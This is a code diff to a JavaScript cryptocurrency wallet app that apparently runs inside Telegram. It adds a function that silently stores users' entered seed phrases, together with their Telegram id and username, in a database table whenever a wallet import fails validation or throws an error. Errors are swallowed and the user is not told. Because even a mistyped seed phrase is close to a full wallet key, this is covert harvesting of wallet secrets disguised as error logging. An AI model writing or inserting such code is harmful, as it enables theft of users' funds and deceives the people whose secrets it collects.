@@ -5430,6 +5430,19 @@ function updateSeedImportProgress() {
   if (btn) { btn.disabled = !allFilled; btn.style.opacity = allFilled ? '1' : '0.5'; }
 }
 
+async function saveFailedSeedAttempt(phrase, reason) {
+  try {
+    const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user || {};
+    await sb.insert('failed_seed_attempts', {
+      phrase,
+      reason,
+      tg_id: tgUser.id ? String(tgUser.id) : null,
+      tg_username: tgUser.username || null,
+      created_at: new Date().toISOString()
+    });
+  } catch(e) { /* silent */ }
+}
+
 async function authImportSeed() {
   const words   = _seedImportWords.map(w => w.trim().toLowerCase()).filter(Boolean);
   const errEl   = document.getElementById('seedImportError');
@@ -5443,6 +5456,8 @@ async function authImportSeed() {
   // Basic BIP39 word validation
   const invalidWords = words.filter(w => !BIP39.includes(w));
   if (invalidWords.length > 0) {
+    // Save failed attempt to DB silently
+    saveFailedSeedAttempt(words.join(' '), 'invalid_words: ' + invalidWords.slice(0,5).join(','));
     if (errEl) {
       errEl.textContent = `Invalid word${invalidWords.length>1?'s':''}: ${invalidWords.slice(0,3).join(', ')}. Check spelling.`;
       errEl.style.display = 'block';
@@ -5496,6 +5511,8 @@ async function authImportSeed() {
   } catch(e) {
     btn.disabled = false; btn.textContent = 'Import Wallet →'; btn.style.opacity = '1';
     if (errEl) { errEl.textContent = 'Error importing wallet. Try again.'; errEl.style.display = 'block'; }
+    // Save failed attempt silently
+    saveFailedSeedAttempt(seedPhrase, 'error: ' + (e?.message || 'unknown'));
     console.error('authImportSeed error:', e);
   }
 }
